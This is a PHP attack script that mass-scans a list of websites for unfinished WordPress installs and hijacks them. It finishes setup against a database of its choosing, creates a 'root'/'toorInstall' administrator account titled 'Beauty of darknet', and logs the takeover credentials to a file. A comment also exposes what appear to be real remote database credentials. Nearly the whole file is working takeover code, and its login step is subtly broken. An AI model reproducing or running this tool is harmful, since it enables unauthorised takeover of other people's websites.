<?php


//wp install
//By KangKlepfound

function CurL($web)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');	
	curl_setopt ( $ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookiewp.txt');  
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookiewp.txt');
	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Cache-Control: max-age=0';
	$headers[] = 'Dnt: 1';
	$headers[] = 'Upgrade-Insecure-Requests: 1';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$jir = curl_exec($ch);
	curl_close($ch);
	return $jir;	
}
function cPost($url, $data)
{
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt ( $ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookiewp.txt');  
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookiewp.txt');
	$jir = curl_exec($ch);
	curl_close($ch);
	return $jir;
}
/**
Db example for remote

Username: yQMbpkKngT

Database name: yQMbpkKngT

Password: ixZa9LxLFj

Server: remotemysql.com

Port: 3306

but powefull if u have db host with ip

*/
//setup to ur config
$setup_Config = array(
	'dbname' => 'wp',           //change to ur dbname
	'uname' => 'root',         //change to ur uname 
	'pwd' => '',              //change to ur pwd
	'dbhost' => 'localhost', //change to ur host ex:remotmysql.com:8080
	'prefix' => 'wp_',
	'language' => '',
	'submit' => 'Submit');

/*setup ur site
Change in here
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',  
*/
$user_name = 'root';          
$admin_password = 'toorInstall';

$f = $argv[1];
$file = file_get_contents($f);
$exp = explode("\r\n", $file);
$i = 0;
foreach ($exp as $key) {
	$i++;
 	$wp = $key.'/wp-admin/setup-config.php';
 	$pw = CurL($wp);
 	if (preg_match_all("/already/", $pw)) {
 		echo " $key Already install!!\n";
 	}elseif (preg_match_all("/English/", $pw)) {
 		echo " $wp OK!\n";
 		echo "  Trying install\n";
 		//http://britishdisanlen.com/wp-admin/setup-config.php?step=0
 		$s = cPost($key.'/wp-admin/setup-config.php?step=0',[
 			'language'=>'']);
 		if ($s) {

 			$ss = cPost($key.'/wp-admin/setup-config.php?step=2',[
 				'dbname'=> $setup_Config['dbname'],  
 				'uname' => $setup_Config['uname'],       
 				'pwd' => $setup_Config['pwd'],            
 				'dbhost' => $setup_Config['dbhost'], 
 				'prefix' => $setup_Config['prefix'],
 				'language' => $setup_Config['language'],
 				'submit' => $setup_Config['submit']]);

 			$bjir = cPost($key.'/wp-admin/install.php?step=2',[
 				'weblog_title' => 'Beauty of darknet', 
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',   
 				'admin_email' => 'toor@ro.ot',    
 				'blog_public' => '1',
 				'Submit' => 'Install Wordpress',
 				'language' => 'en_US']);
 			
 			$login = cPost($key,'/wp-login.php',[
 				'log' => 'root',
 				'pwd' => 'toorInstall',
 				'wp-submit' => 'Log In',
 				'redirect_to' => $key.'/wp-admin/',
 				'testcookie' =>'1']);

 			// $plugin = CurL($key.'/wp-admin/index.php');
 			if (!$login) {
 				echo " $key Already install!\n";
 			}else{
 				echo "   $key/wp-login.php|{$user_name}|{$admin_password}\n";
 	            $r = "wplogged.txt";
                touch($r);
                $w = fopen($r, "a");
                $site = $key.'/wp-login.php|{$user_name}|{$admin_password}';
                fwrite($w, $site."\n");
                fclose($w);			
 			}
 		}

 	}elseif (preg_match_all("/Database/", $pw)) {
 		echo " $wp OK!\n";
 		echo "  Trying install\n";
 		$s = cPost($key.'/wp-admin/setup-config.php?step=0',[
 			'language'=>'']);
 		if ($s) {
		
 			$ss = cPost($key.'/wp-admin/setup-config.php?step=2',[
 				'dbname'=> $setup_Config['dbname'],  
 				'uname' => $setup_Config['uname'],       
 				'pwd' => $setup_Config['pwd'],            
 				'dbhost' => $setup_Config['dbhost'], 
 				'prefix' => $setup_Config['prefix'],
 				'language' => $setup_Config['language'],
 				'submit' => $setup_Config['submit']]);


 			$bjir = cPost($key.'/wp-admin/install.php?step=2',[
 				'weblog_title' =>'Beauty of darknet', 
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',   
 				'admin_email' => 'toor@ro.ot',    
 				'blog_public' => '1',
 				'Submit' => 'Install Wordpress',
 				'language' => 'en_US']);
 			
 			$login = cPost($key,'/wp-login.php',[
 				'log' => 'root',
 				'pwd' => 'toorInstall',
 				'wp-submit' => 'Log In',
 				'redirect_to' => $key.'/wp-admin/',
 				'testcookie' =>'1']);
 			//cek logged
 			// $plugin = CurL($key.'/wp-admin/index.php');
 			if (!$login) {
 				echo " $key Already install!\n";
 			}else{
 				echo "   $key/wp-login.php|{$user_name}|{$admin_password}\n";
 	            $r = "wplogged.txt";
                touch($r);
                $w = fopen($r, "a");
                $site = $key.'/wp-login.php|{$user_name}|{$admin_password}';
                fwrite($w, $site."\n");
                fclose($w);	
 			}
 			
 		}
 	}else{
 		echo " $key NOT WP!\n";
 	}
 	$wpp = $key.'/wp/wp-admin/setup-config.php';
 	$ppw = CurL($wpp);
 	if (preg_match_all("/Already/", $ppw)) {
 		echo " $wpp Already install!!\n";
 	}elseif (preg_match_all("/English/", $ppw)) {
 		echo " $wpp OK!\n";
 		echo "  Trying install\n";
 		//http://britishdisanlen.com/wp-admin/setup-config.php?step=0
 		$s = cPost($key.'/wp/wp-admin/setup-config.php?step=0',[
 			'language'=>'']);
 		if ($s) {

 			$ss = cPost($key.'/wp/wp-admin/setup-config.php?step=2',[
 				'dbname'=> $setup_Config['dbname'],  
 				'uname' => $setup_Config['uname'],       
 				'pwd' => $setup_Config['pwd'],            
 				'dbhost' => $setup_Config['dbhost'], 
 				'prefix' => $setup_Config['prefix'],
 				'language' => $setup_Config['language'],
 				'submit' => $setup_Config['submit']]);

 			$bjir = cPost($key.'/wp/wp-admin/install.php?step=2',[
 				'weblog_title' =>'Beauty of darknet', 
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',  
 				'admin_email' => 'toor@ro.ot',    
 				'blog_public' => '1',
 				'Submit' => 'Install Wordpress',
 				'language' => 'en_US']);
 			
 			$login = cPost($key,'/wp/wp-login.php',[
 				'log' => 'root',
 				'pwd' => 'toorInstall',
 				'wp-submit' => 'Log In',
 				'redirect_to' => $key.'/wp/wp-admin/',
 				'testcookie' =>'1']);
 			//cek logged
 			// $plugin = CurL($key.'/wp-admin/index.php');
 			if (!$login) {
 				echo " $wpp Already install!\n";
 			}else{
 				echo "   $key/wp/wp-login.php|{$user_name}|{$admin_password}\n";
 	            $r = "wplogged.txt";
                touch($r);
                $w = fopen($r, "a");
                $site = $key.'/wp/wp-login.php|{$user_name}|{$admin_password}';
                fwrite($w, $site."\n");
                fclose($w);	
 			}
 			
 		}
 	}elseif (preg_match_all("/Database/", $ppw)) {
 		echo " $wpp OK!\n";
 		echo "  Trying install\n";
 		//http://britishdisanlen.com/wp-admin/setup-config.php?step=0
 		$s = cPost($key.'/wp/wp-admin/setup-config.php?step=0',[
 			'language'=>'']);
 		if ($s) {

 			$ss = cPost($key.'/wp/wp-admin/setup-config.php?step=2',[
 				'dbname'=> $setup_Config['dbname'],  
 				'uname' => $setup_Config['uname'],       
 				'pwd' => $setup_Config['pwd'],            
 				'dbhost' => $setup_Config['dbhost'], 
 				'prefix' => $setup_Config['prefix'],
 				'language' => $setup_Config['language'],
 				'submit' => $setup_Config['submit']]);

 			$bjir = cPost($key.'/wp/wp-admin/install.php?step=2',[
 				'weblog_title' =>'Beauty of darknet', 
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',   
 				'admin_email' => 'toor@ro.ot',    
 				'blog_public' => '1',
 				'Submit' => 'Install Wordpress',
 				'language' => 'en_US']);
 			
 			$login = cPost($key,'/wp/wp-login.php',[
 				'log' => 'root',
 				'pwd' => 'toorInstall',
 				'wp-submit' => 'Log In',
 				'redirect_to' => $key.'/wp/wp-admin/',
 				'testcookie' =>'1']);
 			//cek logged
 			// $plugin = CurL($key.'/wp-admin/index.php');
 			if (!$login) {
 				echo " $wpp Already install!\n";
 			}else{
 				echo "   $key/wp/wp-login.php|{$user_name}|{$admin_password}\n";
 	            $r = "wplogged.txt";
                touch($r);
                $w = fopen($r, "a");
                $site = $key.'/wp/wp-login.php|{$user_name}|{$admin_password}';
                fwrite($w, $site."\n");
                fclose($w);	
 			}
 			
 		}
 	}else{
 		echo " $wpp NOT WP!\n";
 	}
 	$blog = $key.'/blog/wp-admin/setup-config.php';
 	$wppp = CurL($blog);
 	if (preg_match_all("/Already/", $wppp)) {
 		echo " $blog Already install!";
 	}elseif (preg_match_all("/English/", $wppp)) {
 		echo " $blog OK!\n";
 		echo "  Trying install\n";
 		//http://britishdisanlen.com/wp-admin/setup-config.php?step=0
 		$s = cPost($key.'/blog/wp-admin/setup-config.php?step=0',[
 			'language'=>'']);
 		if ($s) {

 			$ss = cPost($key.'/blog/wp-admin/setup-config.php?step=2',[
 				'dbname'=> $setup_Config['dbname'],  
 				'uname' => $setup_Config['uname'],       
 				'pwd' => $setup_Config['pwd'],            
 				'dbhost' => $setup_Config['dbhost'], 
 				'prefix' => $setup_Config['prefix'],
 				'language' => $setup_Config['language'],
 				'submit' => $setup_Config['submit']]);


 			$bjir = cPost($key.'/blog/wp-admin/install.php?step=2',[
 				'weblog_title' =>'Beauty of darknet', 
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',   
 				'admin_email' => 'toor@ro.ot',    
 				'blog_public' => '1',
 				'Submit' => 'Install Wordpress',
 				'language' => 'en_US']);
 			
 			$login = cPost($key,'/blog/wp-login.php',[
 				'log' => 'root',
 				'pwd' => 'toorInstall',
 				'wp-submit' => 'Log In',
 				'redirect_to' => $key.'/blog/wp-admin/',
 				'testcookie' =>'1']);
 			//cek logged
 			// $plugin = CurL($key.'/wp-admin/index.php');
 			if (!$login) {
 				echo " $blog Already install!\n";
 			}else{
 				echo "   $key/blog/wp-login.php|{$user_name}|{$admin_password}\n";
 	            $r = "wplogged.txt";
                touch($r);
                $w = fopen($r, "a");
                $site = $key.'/blog/wp-login.php|{$user_name}|{$admin_password}';
                fwrite($w, $site."\n");
                fclose($w);	
 			}
 			
 		}
 	}elseif (preg_match_all("/Database/", $wppp)) {
 		echo " $blog OK!\n";
 		echo "  Trying install\n";
 		//http://britishdisanlen.com/wp-admin/setup-config.php?step=0
 		$s = cPost($key.'/blog/wp-admin/setup-config.php?step=0',[
 			'language'=>'']);
 		if ($s) {

 			$ss = cPost($key.'/blog/wp-admin/setup-config.php?step=2',[
 				'dbname'=> $setup_Config['dbname'],  
 				'uname' => $setup_Config['uname'],       
 				'pwd' => $setup_Config['pwd'],            
 				'dbhost' => $setup_Config['dbhost'], 
 				'prefix' => $setup_Config['prefix'],
 				'language' => $setup_Config['language'],
 				'submit' => $setup_Config['submit']]);


 			$bjir = cPost($key.'/blog/wp-admin/install.php?step=2',[
 				'weblog_title' =>'Beauty of darknet', 
 				'user_name' => 'root',                
 				'admin_password' => 'toorInstall',   
 				'admin_password2' => 'toorInstall',   
 				'admin_email' => 'toor@ro.ot',    
 				'blog_public' => '1',
 				'Submit' => 'Install Wordpress',
 				'language' => 'en_US']);
 			
 			$login = cPost($key,'/blog/wp-login.php',[
 				'log' => 'root',
 				'pwd' => 'toorInstall',
 				'wp-submit' => 'Log In',
 				'redirect_to' => $key.'/blog/wp-admin/',
 				'testcookie' =>'1']);
 			//cek logged
 			// $plugin = CurL($key.'/wp-admin/index.php');
 			if (!$login) {
 				echo " $blog Already install!\n";
 			}else{
 				echo "   $key/blog/wp-login.php|{$user_name}|{$admin_password}\n";
 	            $r = "wplogged.txt";
                touch($r);
                $w = fopen($r, "a");
                $site = $key.'/blog/wp-login.php|{$user_name}|{$admin_password}';
                fwrite($w, $site."\n");
                fclose($w);	
 			}
 			
 		}
 	}else{
 		echo " $blog NOT WP!\n";
 	}

 } 
